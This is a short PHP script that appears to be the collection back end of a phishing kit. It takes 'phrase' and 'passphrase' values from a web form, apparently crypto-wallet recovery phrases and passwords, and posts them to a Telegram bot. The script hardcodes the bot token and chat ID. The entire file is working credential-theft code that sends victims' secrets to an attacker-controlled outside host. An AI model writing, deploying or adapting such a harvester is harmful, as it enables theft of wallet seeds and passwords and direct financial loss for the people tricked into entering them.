<?php

$phrase=$_REQUEST['phrase'];
$passphrase=$_REQUEST["passphrase"];


// $message= "
// <b>Phrase:</b>&nbsp;&nbsp;".$phrase."
// <br><br>
// <b>Pass phrase:</b>&nbsp;&nbsp;".$passphrase."
// <br><br>";

$message = "
<b>Phrase:</b> " . htmlspecialchars($phrase, ENT_QUOTES, 'UTF-8') . "\n\n
<b>Pass phrase:</b> " . htmlspecialchars($passphrase, ENT_QUOTES, 'UTF-8');


function send_telegram_msg($message){
	
	$botToken  = '7270345641:AAFFUwD_UQJHWqipr25u5omiGM7tEKAth-M'; // Add BotToken here
	$chat_id  = ['6184295200']; //Add Chat ID here
	
	
	$website="https://api.telegram.org/bot".$botToken;
	foreach($chat_id as $ch){
		$params=[
		  'chat_id'=>$ch, 
		  'text'=>$message,
		];
		$ch = curl_init($website . '/sendMessage');
		curl_setopt($ch, CURLOPT_HEADER, false);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 3);
		curl_setopt($ch, CURLOPT_POST, 3);
		curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		$result = curl_exec($ch);
		curl_close($ch);
	}
	return true;
}

send_telegram_msg($message)
?>